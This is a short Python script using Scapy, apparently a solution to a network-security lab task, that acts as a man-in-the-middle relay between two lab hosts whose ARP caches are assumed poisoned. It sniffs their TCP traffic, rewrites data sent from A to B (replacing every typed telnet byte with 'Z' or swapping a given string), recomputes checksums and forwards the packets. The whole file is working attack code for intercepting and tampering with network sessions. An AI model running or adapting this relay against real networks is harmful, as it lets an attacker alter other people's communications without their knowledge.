#!/usr/bin/env python3
# Task 2/3 -- MITM relay run on M (with ip_forward=0 and A/B caches poisoned).
# Captures TCP between A and B, modifies the A->B data, forwards everything else.
# usage: python3 mitm.py            # telnet: replace every typed byte with 'Z'
#        python3 mitm.py OLD NEW    # replace OLD with NEW (same length) in A->B data
from scapy.all import *
import sys

IP_A = '10.9.0.5'
IP_B = '10.9.0.6'
OLD = sys.argv[1].encode() if len(sys.argv) > 2 else None
NEW = sys.argv[2].encode() if len(sys.argv) > 2 else None

def modify(data):
    if OLD is not None:
        return data.replace(OLD, NEW)
    return b'Z' * len(data)

def relay(pkt):
    if IP not in pkt or TCP not in pkt:
        return
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del newpkt.chksum
        del newpkt[TCP].chksum
        if pkt.haslayer(Raw):
            data = modify(pkt[Raw].load)
            newpkt[TCP].remove_payload()
            newpkt = newpkt/Raw(load=data)
        send(newpkt, verbose=0)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del newpkt.chksum
        del newpkt[TCP].chksum
        send(newpkt, verbose=0)

sniff(iface='eth0', filter='tcp and host 10.9.0.5 and host 10.9.0.6', prn=relay)
